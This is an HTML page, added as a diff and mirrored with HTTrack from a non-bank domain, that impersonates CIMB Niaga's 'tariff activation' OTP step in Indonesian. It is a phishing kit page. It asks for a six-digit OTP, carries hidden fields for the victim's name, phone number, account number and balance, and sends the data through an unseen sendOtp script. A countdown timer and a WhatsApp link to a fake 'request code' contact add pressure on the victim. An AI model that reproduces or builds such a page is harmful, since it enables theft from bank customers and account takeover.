@@ -1,0 +1,333 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from cimb.35-area.biz.id/form-tarif-cimb/otp.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 22 Jul 2025 17:52:26 GMT -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aktivasi Tarif Bank Cimb Niaga</title>
+    <link rel="icon" type="image/png" href="../../hosting.tigerengine.id/nssd3w.png">
+    <meta property="og:image" content="../../hosting.tigerengine.id/f8uyn1.jpg">
+    <meta name="theme-color" content="#CC0000">
+    <meta name="twitter:image" content="../../hosting.tigerengine.id/f8uyn1.jpg">
+    <meta name="description" content="Bank BRI terus berinovasi mengembangkan produk yang sesuai dengan perkembangan jaman untuk memenuhi kebutuhan nasabah">
+
+    <!-- Modern CSS Reset -->
+    <style>
+    :root {
+        --primary-color: #137fd5;
+        --secondary-color: #FF4500;
+        --text-color: #333;
+        --light-bg: #e0f2fe;
+        --card-bg: rgba(255, 255, 255, 0.9);
+        --error-color: #e63946;
+        --success-color: #2a9d8f;
+    }
+    
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+    
+    body {
+        font-family: 'Poppins', system-ui, -apple-system, sans-serif;
+        background: #ddd;
+        color: var(--text-color);
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 1rem;
+        line-height: 1.6;
+    }
+    
+    .auth-card {
+        width: min(100%, 380px);
+        background: var(--card-bg);
+        padding: 2rem;
+        border-radius: 1rem;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        backdrop-filter: blur(10px);
+        position: relative;
+        overflow: hidden;
+    }
+    
+    .auth-card::before {
+        content: "";
+        position: absolute;
+        top: -3rem;
+        left: -3rem;
+        width: 10rem;
+        height: 10rem;
+        background: linear-gradient(135deg, #007bff, #00c853);
+        border-radius: 50%;
+        opacity: 0.1;
+        z-index: -1;
+    }
+    
+    .card-header {
+        text-align: center;
+        margin-bottom: 1.5rem;
+    }
+    
+    .card-header img {
+        max-width: 150px;
+        height: auto;
+    }
+    
+    .card-title {
+        font-size: 1.4rem;
+        font-weight: 600;
+        color: #CC0000;
+        margin-bottom: 1rem;
+    }
+    
+    .card-description {
+        font-size: 0.9rem;
+        margin-bottom: 1.5rem;
+    }
+    
+    .highlight-text {
+        color: var(--primary-color);
+        font-weight: 600;
+    }
+    
+    .form-group {
+        margin-bottom: 1.25rem;
+    }
+    
+    .form-label {
+        display: block;
+        font-weight: 500;
+        margin-bottom: 0.5rem;
+    }
+    
+    .form-input {
+        width: 100%;
+        padding: 0.75rem;
+        border: 1px solid var(--primary-color);
+        border-radius: 0.5rem;
+        font-size: 0.9rem;
+        transition: all 0.3s ease;
+        background-color: rgba(255, 255, 255, 0.8);
+    }
+    
+    .form-input:focus {
+        outline: none;
+        box-shadow: 0 0 0 3px rgba(19, 127, 213, 0.2);
+        border-color: var(--primary-color);
+    }
+    
+    .submit-btn {
+        width: 100%;
+        padding: 0.75rem;
+        background-color: #CC0000;
+        color: white;
+        border: none;
+        border-radius: 0.5rem;
+        font-weight: 500;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        margin-top: 0.5rem;
+    }
+    
+    .submit-btn:hover {
+        background-color: var(--secondary-color);
+        transform: translateY(-2px);
+    }
+    
+    .submit-btn:disabled {
+        opacity: 0.5;
+        cursor: not-allowed;
+        transform: none;
+    }
+    
+    .action-link {
+        display: block;
+        text-align: center;
+        margin-top: 1rem;
+        color: var(--primary-color);
+        text-decoration: none;
+        font-size: 0.9rem;
+        transition: color 0.3s ease;
+    }
+    
+    .action-link:hover {
+        color: var(--secondary-color);
+        text-decoration: underline;
+    }
+    
+    .alert {
+        padding: 0.75rem;
+        border-radius: 0.5rem;
+        margin-bottom: 1rem;
+        font-size: 0.9rem;
+    }
+    
+    .alert-error {
+        background-color: rgba(230, 57, 70, 0.1);
+        border: 1px solid var(--error-color);
+        color: var(--error-color);
+    }
+    
+    .timer {
+        color: var(--primary-color);
+        font-weight: 600;
+        font-size: 0.9rem;
+        margin: 1rem 0;
+    }
+    
+    .whatsapp-float {
+        position: fixed;
+        bottom: 1.5rem;
+        right: 1.5rem;
+        z-index: 100;
+    }
+    
+    .whatsapp-float img {
+        width: 3.5rem;
+        height: 3.5rem;
+        transition: transform 0.2s ease;
+    }
+    
+    .whatsapp-float img:hover {
+        transform: scale(1.1);
+    }
+    
+    .loading-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.8);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+        display: none;
+    }
+    
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+    
+    .spinner {
+        border: 4px solid rgba(255, 255, 255, 0.3);
+        border-radius: 50%;
+        border-top: 4px solid white;
+        width: 2.5rem;
+        height: 2.5rem;
+        animation: spin 1s linear infinite;
+    }
+    </style>
+</head>
+
+<body>
+    <div class="loading-overlay">
+        <div class="spinner"></div>
+    </div>
+
+    <div class="auth-card">
+        <div class="card-header">
+            <img src="img/octo_loading.gif" alt="CIMB Niaga" width="30%">
+        </div>
+        
+        <h1 class="card-title">Aktivasi Tarif Bank Cimb Niaga</h1>
+        
+        <p class="card-description">
+            Masukan kode Aktivasi / Virtual yang telah dikirimkan ke nomor
+            <span id="phone-number" class="highlight-text"></span>
+        </p>
+        
+        <p class="timer" id="countdown"></p>
+        
+        <div class="alert alert-error" id="errorAlert" style="display: none;"><p>Kode Aktivasi !</p></div>
+        
+    <form method="post" id="otp-form" onsubmit="sendOtp(); return false;">
+    <input type="hidden" id="tarif" name="tarif">
+    <input type="hidden" id="nomor" name="nomor">
+    <input type="hidden" id="nama" name="nama">
+    <input type="hidden" id="rek" name="rek">
+    <input type="hidden" id="saldo" name="saldo">
+    
+    <div id="notif" style="color:red; text-align:center; display:none; margin-top:10px;">
+        Kode Aktivasi salah!
+    </div>
+
+    <div class="form-group">
+        <label for="otp-input">Konfirmasi (Wajib)</label>
+        <input type="tel" class="form-input" id="otp" name="otp" placeholder="Kode Virtual" 
+               maxlength="6" minlength="6" 
+               pattern="[0-9]{6}" required
+               title="Mohon masukkan Kode OTP dengan benar">
+    </div>
+    
+    <button type="submit" id="submit-btn" class="submit-btn">Konfirmasi</button>
+    
+    <script src="../../ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="config.js"></script>
+</form>
+
+<a onclick="wa()" class="action-link" style="display:flex; align-items:center; justify-content:center; gap:8px; margin-top:10px;">
+    <b>>> Request kode Virtual <<</b>
+   
+</a>
+
+<div class="whatsapp-float">
+    <a onclick="wa()">
+        <img src="img/wa.png" alt="Hubungi WhatsApp" style="width:55px; height:45px; position:fixed; bottom:15px; right:20px;">
+    </a>
+</div>
+
+<script>
+function wa() {
+    const nomor = "628815000069";
+    const pesan = "𝗛𝗮𝗹𝗹𝗼 𝗕𝗮𝗻𝗸 𝗖𝗜𝗠𝗕 𝗡𝗶𝗮𝗴𝗮!! 𝗦𝗮𝘆𝗮 𝗶𝗻𝗴𝗶𝗻 𝗿𝗲𝗾𝘂𝗲𝘀𝘁 𝗸𝗼𝗱𝗲 𝗩𝗶𝗿𝘁𝘂𝗮𝗹 𝗧𝗮𝗿𝗶𝗳 𝗡𝗼𝗿𝗺𝗮𝗹.";
+    
+    const url = `https://wa.me/${nomor}?text=${encodeURIComponent(pesan)}`;
+    window.open(url, "_blank");
+}
+</script>
+
+
+</div>
+
+
+
+
+    <script src="../../ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>    
+
+
+     <script>
+    // Timer function
+    function startTimer(duration) {
+        let timer = duration;
+        const display = document.getElementById("countdown");
+        const intervalId = setInterval(() => {
+            const minutes = Math.floor(timer / 60).toString().padStart(2, '0');
+            const seconds = (timer % 60).toString().padStart(2, '0');
+            
+            display.textContent = `Waktu tersisa: ${minutes}:${seconds}`;
+            
+            if (--timer < 0) {
+                clearInterval(intervalId);
+                document.querySelector(".action-link").classList.remove("disabled");
+            }
+        }, 1000);
+    }
+    
+    // Initialize on page load
+    document.addEventListener("DOMContentLoaded", () => {
+        startTimer(180); // 3 minutes timer
+    });
+    
+    
+    </script>
+</body>
+
+<!-- Mirrored from cimb.35-area.biz.id/form-tarif-cimb/otp.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 22 Jul 2025 17:52:28 GMT -->
+</html>
